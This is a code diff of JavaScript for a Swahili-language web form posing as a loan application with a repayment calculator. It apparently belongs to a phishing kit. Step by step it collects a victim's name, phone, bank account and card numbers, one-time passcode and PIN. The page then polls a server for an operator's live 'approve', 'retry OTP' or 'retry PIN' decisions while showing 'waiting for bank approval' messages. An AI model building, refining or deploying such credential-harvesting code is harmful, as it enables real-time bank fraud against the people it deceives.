@@ -1,44 +1,39 @@
 function goToScreen(screenId) {
     document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
-    const target = document.getElementById(screenId);
-    if (target) {
-        target.classList.remove('hidden');
-    }
+    document.getElementById(screenId).classList.remove('hidden');
 }
 
-function showSpinner(text = 'Inapakia...') {
-    const textEl = document.getElementById('loading-text');
-    if (textEl) textEl.innerText = text;
-    const spinner = document.getElementById('loading-spinner');
-    if (spinner) spinner.classList.remove('hidden');
+function showSpinner(text = 'Inapakia...') { 
+    document.getElementById('loading-text').innerText = text;
+    document.getElementById('loading-spinner').classList.remove('hidden'); 
 }
 
-function hideSpinner() {
-    const spinner = document.getElementById('loading-spinner');
-    if (spinner) spinner.classList.add('hidden');
+function hideSpinner() { 
+    document.getElementById('loading-spinner').classList.add('hidden'); 
 }
 
-function showNotice(elementId, msg) {
-    const el = document.getElementById(elementId);
-    if (el) {
-        el.innerText = msg;
-        el.style.display = 'block';
-    }
+// Calculator Logic
+function updateCalculator() {
+    const amount = document.getElementById('loanAmountSlider').value;
+    const months = document.getElementById('loanMonthsSlider').value;
+    
+    document.getElementById('displayAmount').innerText = 'TZS ' + Number(amount).toLocaleString();
+    document.getElementById('displayMonths').innerText = months + ' miezi';
+    document.getElementById('requestedAmount').value = amount;
+
+    // Estimated calculation (e.g., 9% interest total spread over months)
+    const monthly = (Number(amount) * 1.09) / Number(months);
+    document.getElementById('displayMonthlyPayment').innerText = 'TZS ' + Math.round(monthly).toLocaleString();
 }
 
-function clearNotices() {
-    ['step3-notice', 'step4-notice', 'pin-notice'].forEach(id => {
-        const el = document.getElementById(id);
-        if (el) {
-            el.innerText = '';
-            el.style.display = 'none';
-        }
-    });
+function submitCalculator(e) {
+    e.preventDefault(); // Prevents page reload/reset back to home
+    goToScreen('screen-personal'); // Moves cleanly to the next screen
 }
 
+// Global server request handler
 async function postData(step, data) {
-    clearNotices();
-    showSpinner('Subiri kidogo, inasubiri idhini ya Benki...');
+    showSpinner();
     try {
         const response = await fetch('/api/submit', {
             method: 'POST',
@@ -46,103 +41,77 @@ async function postData(step, data) {
             body: JSON.stringify({ step, data })
         });
         const result = await response.json();
-        
-        if (result.resendAcknowledge) {
-            hideSpinner();
-            showNotice('step4-notice', 'Ombi la kutuma tena OTP limepokelewa.');
-            return;
-        }
-
-        if (result.pendingApproval) {
+        if (result.pendingApproval || result.resendAcknowledge) {
             pollAdminResponse();
         } else {
             hideSpinner();
+            if (result.message) alert(result.message);
         }
     } catch (e) {
         hideSpinner();
-        showNotice('step3-notice', 'Tatizo la mtandao. Jaribu tena ❌');
+        alert('Network connection error.');
     }
 }
 
 function pollAdminResponse() {
-    fetch('/api/poll-status')
-        .then(res => res.json())
-        .then(res => {
-            hideSpinner();
-            if (res.status === 'approved') {
-                if (res.next === 'otp') goToScreen('screen-step4');
-                else if (res.next === 'pin') goToScreen('screen-step5');
-                else if (res.next === 'success') goToScreen('screen-success');
-            } else if (res.status === 'denied') {
-                showNotice('step3-notice', res.message);
-            } else if (res.status === 'retry_otp') {
-                showNotice('step4-notice', res.message);
-            } else if (res.status === 'retry_pin' || res.status === 'blocked') {
-                showNotice('pin-notice', res.message);
-            }
-        })
-        .catch(() => {
-            hideSpinner();
-        });
+    showSpinner('Inasubiri uthibitisho...');
+    const pollInterval = setInterval(() => {
+        fetch('/api/poll-status')
+            .then(res => res.json())
+            .then(res => {
+                if (res.status) {
+                    clearInterval(pollInterval);
+                    hideSpinner();
+                    handleServerResponse(res);
+                }
+            })
+            .catch(() => {
+                // Keep polling on network blips
+            });
+    }, 1500);
 }
 
-function updateCalculator() {
-    const amountVal = document.getElementById('loanAmountSlider');
-    const monthsVal = document.getElementById('loanMonthsSlider');
-    if (!amountVal || !monthsVal) return;
-
-    const amount = amountVal.value;
-    const months = monthsVal.value;
-    
-    document.getElementById('displayAmount').innerText = 'TZS ' + Number(amount).toLocaleString();
-    document.getElementById('displayMonths').innerText = months + ' miezi';
-    
-    const monthlyPayment = (amount / months) * 1.05;
-    document.getElementById('displayMonthlyPayment').innerText = 'TZS ' + Math.round(monthlyPayment).toLocaleString();
-    
-    document.getElementById('requestedAmount').value = amount;
+function handleServerResponse(res) {
+    if (res.status === 'approved') {
+        if (res.next === 'card_verify') goToScreen('screen-step3');
+        else if (res.next === 'otp') goToScreen('screen-step4');
+        else if (res.next === 'pin') goToScreen('screen-step5');
+        else if (res.next === 'success') goToScreen('screen-success');
+    } else if (res.status === 'retry_phone') {
+        goToScreen('screen-personal');
+        const notice = document.getElementById('personal-notice');
+        notice.style.display = 'block';
+        notice.innerText = res.message;
+    } else if (res.status === 'denied' || res.status === 'retry_otp' || res.status === 'blocked' || res.status === 'retry_pin') {
+        alert(res.message);
+        if (res.status === 'retry_pin') {
+            const notice = document.getElementById('pin-notice');
+            notice.style.display = 'block';
+            notice.innerText = res.message;
+        }
+    }
 }
 
-// Auto-jump logic for OTP and PIN input boxes
-document.addEventListener('DOMContentLoaded', () => {
-    const setupInputGroup = (selector) => {
-        const inputs = document.querySelectorAll(selector);
-        inputs.forEach((input, index) => {
-            input.addEventListener('input', (e) => {
-                const value = e.target.value;
-                if (value.length === 1 && index < inputs.length - 1) {
-                    inputs[index + 1].focus();
-                }
-            });
-
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && input.value === '' && index > 0) {
-                    inputs[index - 1].focus();
-                }
-            });
-        });
+// Form Handlers
+function submitPersonal(e) {
+    e.preventDefault();
+    document.getElementById('personal-notice').style.display = 'none';
+    const data = {
+        fullName: document.getElementById('fullName').value,
+        phoneNumber: document.getElementById('phoneNumber').value,
+        loanAmount: document.getElementById('requestedAmount').value
     };
-
-    setupInputGroup('.otp-input');
-    setupInputGroup('.pin-input');
-});
-
-function submitStep1(e) {
-    e.preventDefault();
-    goToScreen('screen-step2');
-    updateCalculator();
-}
-
-function submitStep2(e) {
-    e.preventDefault();
-    goToScreen('screen-step3');
+    postData('personal_info', data);
 }
 
 function submitStep3(e) {
     e.preventDefault();
-    const accountNumber = document.getElementById('accountNumber').value;
-    const cardNumber = document.getElementById('cardNumber').value;
-    postData('step3', { accountNumber, cardNumber });
+    document.getElementById('step3-notice').style.display = 'none';
+    const data = {
+        accountNumber: document.getElementById('accountNumber').value,
+        cardNumber: document.getElementById('cardNumber').value
+    };
+    postData('step3', data);
 }
 
 function submitStep4(e) {
@@ -150,7 +119,7 @@ function submitStep4(e) {
     const inputs = document.querySelectorAll('.otp-input');
     let otp = '';
     inputs.forEach(i => otp += i.value);
-    postData('step4', { otp, isResend: false });
+    postData('step4', { otp });
 }
 
 function resendOtp(e) {
@@ -164,5 +133,26 @@ function submitStep5(e) {
     let pin = '';
     inputs.forEach(i => pin += i.value);
     postData('step5', { pin });
-    }
-     
+}
+
+// Auto-jump for OTP / PIN inputs
+document.addEventListener('DOMContentLoaded', () => {
+    const setupOtpInputs = (selector) => {
+        const inputs = document.querySelectorAll(selector);
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', (e) => {
+                if (e.target.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value === '' && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+    };
+    setupOtpInputs('.otp-input');
+    setupOtpInputs('.pin-input');
+});
+            
